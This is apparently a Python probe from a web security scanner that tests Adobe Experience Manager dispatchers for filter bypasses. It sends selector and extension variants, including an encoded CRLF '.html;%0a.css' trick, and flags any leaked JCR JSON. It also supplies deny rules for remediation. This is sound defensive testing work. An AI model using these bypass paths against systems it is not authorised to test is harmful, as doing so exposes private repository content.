#!/usr/bin/env python3
# Author: Tim Rice <tim.j.rice@hackrange.com>
# Part of nextgen-dast. See README.md for license and overall architecture.
"""
AEM dispatcher: selector / extension filter bypass.

Adobe's hardened dispatcher rules typically allow `/content/site.html`
through to publish but deny `.json`, `.infinity.json`, `.tidy.json`,
and similar selector-form paths that Sling treats as JCR
serialization. Operators frequently miss bypass forms:

  - `/path.1.json`  / `.-1.json`        -- numeric depth selectors
                                            that Sling honors but
                                            many filters miss.
  - `/path.infinity.json`               -- the canonical "give me
                                            everything" form.
  - `/path.html;%0a.css` / `.html%0d`    -- CRLF / extension-trick
                                            bypasses where the
                                            dispatcher routes by
                                            the trailing `.css`
                                            but Sling resolves the
                                            real `.html`.

The neighboring probe `aem_sling_dotjson_selectors` covers the
unconditional `.json` form on the root. This one targets the
*bypass* class -- variants intended to slip past dispatcher
filters that DO block the simple `.json` form.

High-fidelity rule:
  (a) baseline GET of a path returns content (proves the page
      exists);
  (b) at least one bypass variant returns extra content the
      baseline did not -- specifically a JCR-shape body
      (`jcr:primaryType` field) or a longer response with
      additional structural data.

Detection signal:
  GET baseline path; for each bypass form, GET the variant; flag
  when a bypass returns JCR content the baseline didn't.
"""
from __future__ import annotations

import re
import sys
from pathlib import Path
from urllib.parse import urljoin, urlparse

sys.path.insert(0, str(Path(__file__).parent.parent))
from lib import Probe, Verdict, SafeClient   # noqa: E402

# Baseline paths to test against. We use the root and a small
# common-path list -- AEM publish hosts almost always have at
# least one of these.
BASELINE_PATHS = ("/", "/content", "/content/we-retail",
                  "/content/site")

# Bypass variants applied to whichever baseline returns content.
# We use a placeholder `{p}` that's substituted in run().
BYPASS_VARIANTS = (
    "{p}.json",
    "{p}.1.json",
    "{p}.-1.json",
    "{p}.infinity.json",
    "{p}.tidy.json",
    "{p}.docview.json",
    "{p}.html;%0a.css",
    "{p}.html%0a.css",
    "{p}.children.json",
)

# JCR primaryType is unique to Sling responses. Same anchor used
# by the existing aem_sling_dotjson_selectors probe.
JCR_RE = re.compile(r'"jcr:primaryType"\s*:\s*"[^"]+"')


class AemDispatcherSelectorExtensionBypassProbe(Probe):
    name = "aem_dispatcher_selector_extension_bypass"
    summary = ("Detects AEM dispatcher bypass via selector / "
               "extension tricks (.1.json, .-1.json, "
               ".html;%0a.css).")
    safety_class = "read-only"

    def add_args(self, parser):
        parser.add_argument(
            "--baseline", action="append", default=[],
            help="Additional baseline path to try (repeatable).")

    def run(self, args, client: SafeClient) -> Verdict:
        if not args.url:
            return Verdict(ok=False, error="--url is required")
        parsed = urlparse(args.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        baselines = list(BASELINE_PATHS) + list(args.baseline or [])

        attempts: list[dict] = []
        # Step 1: pick a baseline path that actually responds 200
        # so the bypass test has something meaningful to compare
        # against.
        chosen_baseline: tuple[str, int] | None = None
        for p in baselines:
            r = client.request("GET", urljoin(origin, p))
            row = {"step": "baseline", "path": p, "status": r.status,
                   "size": r.size}
            attempts.append(row)
            if r.status == 200 and r.size > 0:
                chosen_baseline = (p, r.size)
                break
        if not chosen_baseline:
            return Verdict(
                validated=False, confidence=0.85,
                summary=(f"Refuted: no candidate AEM baseline path "
                         f"on {origin} responded with content."),
                evidence={"origin": origin, "attempts": attempts},
            )
        baseline_path, baseline_size = chosen_baseline

        # Step 2: try each bypass form. Confirm only when we see
        # JCR content where baseline returned ordinary HTML.
        confirmed: dict | None = None
        for tmpl in BYPASS_VARIANTS:
            path = tmpl.format(p=baseline_path)
            # Avoid double-leading-slash when baseline_path is "/".
            if path.startswith("//"):
                path = path[1:]
            r = client.request("GET", urljoin(origin, path))
            row: dict = {"step": "bypass", "path": path,
                         "status": r.status, "size": r.size,
                         "baseline_size": baseline_size}
            if r.status == 200 and r.body:
                text = r.text or ""
                jcr_hits = JCR_RE.findall(text)
                if jcr_hits:
                    row["jcr_primary_types_seen"] = jcr_hits[:5]
                    row["snippet"] = text[:200]
                    confirmed = row
                    attempts.append(row)
                    break
            attempts.append(row)

        evidence = {"origin": origin,
                    "baseline_path": baseline_path,
                    "attempts": attempts}
        if confirmed:
            return Verdict(
                validated=True, confidence=0.93,
                summary=(
                    f"Confirmed: AEM dispatcher bypass at "
                    f"{origin}{confirmed['path']}. Baseline "
                    f"`{baseline_path}` returns ordinary content; the "
                    "bypass variant returns JCR-shape JSON with "
                    "`jcr:primaryType` fields. The dispatcher's "
                    "filter rules let this selector / extension form "
                    "through to Sling's default servlet."),
                evidence={**evidence, "confirmed": confirmed},
                severity_uplift="high",
                remediation=(
                    "Tighten dispatcher.any /filter rules to deny "
                    "every selector form, not just the bare "
                    "`.json`:\n"
                    "  ```\n"
                    "  /0001 { /type \"deny\" /url "
                    "\"\\.(infinity|tidy|sysview|docview|query|feed|"
                    "json|jsonp|xml|children)\" }\n"
                    "  /0002 { /type \"deny\" /url \"\\.[0-9-]+\\."
                    "json\" }\n"
                    "  /0003 { /type \"deny\" /url \";.*\\.css\" }\n"
                    "  ```\n"
                    "Reset the dispatcher cache after the change so "
                    "any already-served JCR JSON is evicted. Audit "
                    "logs for these bypass forms during the exposure "
                    "window."),
            )
        return Verdict(
            validated=False, confidence=0.85,
            summary=(f"Refuted: tested {len(BYPASS_VARIANTS)} "
                     f"bypass variants against baseline "
                     f"`{baseline_path}` on {origin}; none returned "
                     "JCR-shape content."),
            evidence=evidence,
        )


if __name__ == "__main__":
    AemDispatcherSelectorExtensionBypassProbe().main()
